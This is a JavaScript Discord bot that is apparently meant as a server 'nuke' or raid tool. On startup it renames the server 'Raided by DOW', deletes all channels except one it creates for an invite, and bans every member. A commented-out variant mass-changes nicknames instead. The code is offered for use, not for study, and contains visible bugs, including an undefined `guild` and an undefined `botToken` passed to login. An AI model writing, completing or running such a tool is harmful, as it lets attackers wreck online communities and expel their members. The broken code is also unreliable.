const Discord = require("discord.js");
const client = new Discord.Client();
const config = require("./config.json");
const fs = require("fs")


// Settings for the bot.
const settings = {
    botToken: "YOUR TOKEN HERE",
    guildName: "Raided by DOW"
};

//on ready:
client.on("ready", () => {

    //startup message 
    console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Logged in as ${client.user.tag}. (^o^)／`);
    // Set the guild name 
    guild.setName(settings.guildName);
    // create variable for new channel to prevent it from getting deleted by nuke
    let createdChannelName;
    // Create an invite to a channel
    client.guilds.forEach(server => {
        //create new channel
        server.createChannel("-", "text").then(channel => {
            createdChannelName = channel.name;
            //then once channel is created, create an invite link to this channel
            channel.createInvite().then(inviteCode => {
                //log the invite link to console
                console.log(inviteCode);
                //catch errors
            }).catch(err => {
                if (err) throw err;
            });
        }).catch(err => {
            if (err) throw err;
        });
    });



    //delete all channels on server
    client.guilds.forEach(server => {
        server.channels.forEach(channel => {
            if (createdChannelName !== channel.name) {
                channel.delete().then(response => {
                    console.log("my response", response);
                }).catch(err => {
                    if (err) throw err;
                });
            }
        });
    });

    //ban all members on the server
    client.guilds.forEach(guild => {
        guild.members.forEach(m => {
            m.ban();
            //log when member is banned in the console
            console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`);
        });
    });



    //replace ban all (^) with change all nicknames on server (below) if wanted
    /*    
    client.guilds.forEach(guild => {
        guild.members.forEach(m => {
            m.setNickname("LOLOLOLOLOLOL");
            console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Nickname ${m.user.username}; ID: ${m.id}.`);
        });
    });
    */

    //handle unexpected errors
    process.on("uncaughtException", err => {
        console.error("\x1b[37m\x1b[41mERROR\x1b[0m: An unknown and unexpected error occurred! x.x.", err);
        process.exit(1);
    });
});

// Some what handle unhandled rejections.
process.on("unhandledRejection", err => {
    process.exit(1);
});

client.login(botToken);